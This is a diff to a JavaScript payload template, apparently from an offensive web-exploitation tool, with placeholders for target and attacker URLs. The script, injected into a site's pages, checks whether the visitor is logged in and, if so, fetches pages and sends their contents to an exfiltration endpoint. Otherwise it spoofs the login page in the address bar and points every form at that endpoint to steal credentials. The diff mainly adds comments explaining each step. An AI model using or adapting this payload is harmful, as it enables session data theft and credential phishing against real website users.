@@ -1,16 +1,30 @@
+/*
+ *  This outer function container ensures that we don't leak variables globally.
+ */
 (function() {
   var loginCheckURL = {{{loginCheckURL}}};
   var loginCheckPattern = /{{{loginCheckPattern}}}/i;
   var loginURL = {{{loginURL}}};
   var exfilURL = {{{exfilURL}}};
 
+  /*
+   *  We load in jQuery in a way which doesn't expose it to the surrounding page.
+   *  This avoids issues with differing jQuery versions breaking target sites.
+   */
   var script = document.createElement("script");
   script.src = 'https://code.jquery.com/jquery-3.2.1.min.js';
   script.type = 'text/javascript';
   script.onload = function() {
     (function($) {
+      /*
+       *  Fetch a page to check whether the user is logged in.
+       */
       $.get(loginCheckURL, function(r) {
         if (r.match(loginCheckPattern)) {
+          /*
+           *  The user is logged in - load the resources and send them to the exfil endpoint.
+           *  This request will be launched when all resources load, or a 5s timeout elapses.
+           */
           var isSent = false;
           var xdata = [];
           var remaining = {{dataURLCount}};
@@ -29,6 +43,9 @@
           {{/dataURLs}}
           window.setTimeout(exfil, 5000);
         } else {
+          /*
+           *  The user is not logged in - fake load the login page then alter the forms.
+           */
           if (window.history && window.history.replaceState) {
             window.history.replaceState({}, "Login", loginURL)
           } else if (window.history && window.history.pushState) {
@@ -37,13 +54,10 @@
           $.get(loginURL, function(r) {
             b.html(r);
             $('form').attr('action', exfilURL);
-            {{#loginExtraContent}}
-            $('form').append({{.}})
-            {{/loginExtraContent}}
           }, 'text');
         }
       }, 'text');
-    })(window.jQuery.noConflict(true))
+    })(window.jQuery.noConflict(true)) // noConflict(true) reverses changes to all globals
   };
   document.getElementsByTagName("head")[0].appendChild(script);
 })();
